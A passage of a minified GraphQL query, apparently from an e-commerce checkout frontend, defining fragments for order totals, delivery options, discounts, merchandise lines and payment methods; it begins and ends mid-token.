currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}isShippingRequired remote{consolidated{totals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms deliveryPredictionEligible brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment ParentMerchandiseLine on MerchandiseLine{stableId lineAllocations{stableId __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}cartMetafields{...on CartMetafieldUpdateOperation{key namespace value type appId namespaceAppId valueType __typename}__typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}shopCashBalance{...on UnavailableTerms{__typename _singleInstance}...on FilledShopCashBalance{availableBalance{amount currencyCode __typename}__typename}...on PendingTerms{taskId pollDelay __typename}__typename}shopPromotion{...on FilledShopPromotion{promotions{promotionId availableBalance{amount currencyCode __typename}__typename}__typename}...on PendingTerms{taskId pollDelay __typename}...on UnavailableTerms{__typename _singleInstance}__typename}shopDiscountOffer{...on UnavailableTerms{__typename _singleInstance}...on FilledShopDiscountOffer{discountOffer{adType campaignHandle offerAmount{amount currencyCode __typename}minimumOrderValue{amount currencyCode __typename}minimumOrderValueRemainder{amount currencyCode __typename}minimumOrderValueSatisfied __typename}__typename}...on PendingTerms{taskId pollDelay __typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress mustSelectProvidedShippingRate canUpdateDiscountCodes canUpdateDeliveryAddress canUpdateMerchandise delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle crossBorder deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{...AvailablePaymentLine __typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded bwpItems merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{shopUser{publicId metafields{key namespace value type valueType __typename}__typename}customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAmountRange{...on MoneyIntervalConstraint{lowerBound{amount currencyCode __typename}upperBound{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired remote{...RemoteDetails __typename}__typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment AvailablePaymentLine on AvailablePaymentLine{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}displayIncentive}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on BankPaymentMethod{displayName orderingIndex paymentMethodIdentifier paymentProviderClientCredentials{apiClientKey merchantAccountId __typename}availableInstruments{bankName lastDigits shopifyPublicToken accountType __typename}supportsVaulting __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}metafieldRequests{namespace key __typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId payerApprovedAmount{amount currencyCode __typename}currencyCode __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on BankPaymentInstrument{paymentMethodIdentifier __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment RemoteDetails on Remote{consolidated{taxes{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxesIncludedAmountInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}termsStatus __typename}totals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}delivery{deliveryMacros{id title amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTitle __typename}isShippingRequired termsStatus __typename}payment{termsStatus availablePaymentLines{...AvailablePaymentLine __typename}__typename}__typename}remoteNegotiations{shopId sessionToken checkoutSessionIdentifier errors{...ViolationDetails __typename}result{...on RemoteNegotiationResultAvailable{queueToken sellerProposal{...RemoteSellerProposalFragment __typename}buyerProposal{...RemoteBuyerProposalFragment __typename}__typename}...on RemoteNegotiationResultUnavailable{reason __typename}__typename}__typename}__typename}fragment ViolationDetails on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on RedirectRequiredViolation{target details __typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}fragment RemoteSellerProposalFragment on RemoteProposal{merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on 